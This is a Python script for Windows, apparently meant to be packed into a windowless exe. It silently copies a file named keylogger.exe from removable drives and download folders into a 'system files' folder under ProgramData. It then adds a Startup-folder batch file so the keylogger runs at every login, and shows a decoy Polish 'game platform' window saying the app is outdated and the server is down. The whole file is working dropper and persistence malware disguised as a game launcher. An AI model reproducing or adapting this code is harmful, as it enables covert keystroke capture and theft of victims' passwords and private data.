###### install exe for GIT - TK :
# pyinstaller --hidden-import=pkg_resources.py2_warn --onefile --noconsole example.py


# PYTHON-NOTE


# only for system windows
from tkinter import *
from PIL import ImageTk,Image
import os
import os.path
from shutil import copyfile
from contextlib import suppress
import time
import tkinter.font as font


USER_PROFILE = (os.environ['USERPROFILE'])



def window_app():
    window1 = Tk()
    window1.title("Platforma pełna wspaniałych gier")
    obraz = ImageTk.PhotoImage(Image.open("C:\\Users\\xarve\Desktop\ori.jpg"))
    mylabel = Label(image=obraz)
    window1.title("wersja 2019.v2")
    mylabel.pack()

    myFont = font.Font(family='Arial', size=15, weight='bold')

    button_window = Button(window1,
                           text="APLIKACJA JEST PRZESTARZAŁA... SERWER NIE ODPOWIADA, \n\nKLIKIJ ABY ZAKOŃCZYĆ",
                           height=5, bg='lightblue', fg='black', command=window1.quit)
    button_window['font'] = myFont
    button_window.pack()
    window1.mainloop()




def copy_pase():

        with suppress(Exception):
            copyfile('D:/keylogger.exe', 'C:/ProgramData/pliki_systemowe/keylogger.exe')
        with suppress(Exception):
            copyfile('E:/keylogger.exe', 'C:/ProgramData/pliki_systemowe/keylogger.exe')
        with suppress(Exception):
            copyfile('F:/keylogger.exe', 'C:/ProgramData/pliki_systemowe/keylogger.exe')
        with suppress(Exception):
            copyfile('G:/keylogger.exe', 'C:/ProgramData/pliki_systemowe/keylogger.exe')
        with suppress(Exception):
            copyfile('H:/keylogger.exe', 'C:/ProgramData/pliki_systemowe/keylogger.exe')
        with suppress(Exception):
            copyfile('I:/keylogger.exe', 'C:/ProgramData/pliki_systemowe/keylogger.exe')
        with suppress(Exception):
            copyfile('Downloads/keylogger.exe', 'C:/ProgramData/pliki_systemowe/keylogger.exe')
        with suppress(Exception):
            copyfile('Pobrane/keylogger.exe', 'C:/ProgramData/pliki_systemowe/keylogger.exe')




def add_to_startup(file_path='C:/ProgramData/pliki_systemowe/keylogger.exe'):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = r'%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_PROFILE
    with open(bat_path + '\\' + "open.bat", "w") as bat_file:
        bat_file.write(r'@echo off'+ os.linesep)   ## to hide console batch file when it run
        bat_file.write(r'start "" %s' % file_path)



path = "C:\\ProgramData\pliki_systemowe"
if not os.path.exists(path):
    os.makedirs(path)
    time.sleep(2)



time.sleep(2)
copy_pase()
time.sleep(2)
add_to_startup()
window_app()
